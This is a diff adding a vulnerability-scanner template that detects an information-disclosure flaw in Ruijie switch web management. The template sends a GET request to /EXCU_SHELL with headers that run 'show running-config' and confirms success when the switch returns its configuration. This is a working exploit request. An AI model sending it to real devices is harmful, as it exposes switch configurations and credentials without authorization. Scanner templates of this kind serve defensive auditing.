@@ -1,0 +1,21 @@
+id: ruijie-excu-shell-disclosure
+
+info:
+  name: 锐捷交换机 WEB 管理系统 EXCU_SHELL 信息泄露
+  author: zan8in
+  severity: high
+  verified: true
+  tags: ruijie,disclosure
+  created: 2023/09/03
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /EXCU_SHELL
+      headers:
+        Cmdnum: '1'
+        Command1: show running-config
+        Confirm1: n
+    expression: response.status == 200 && response.body.bcontains(b"Building configuration") && response.body.bcontains(b"Current configuration")
+expression: r0()
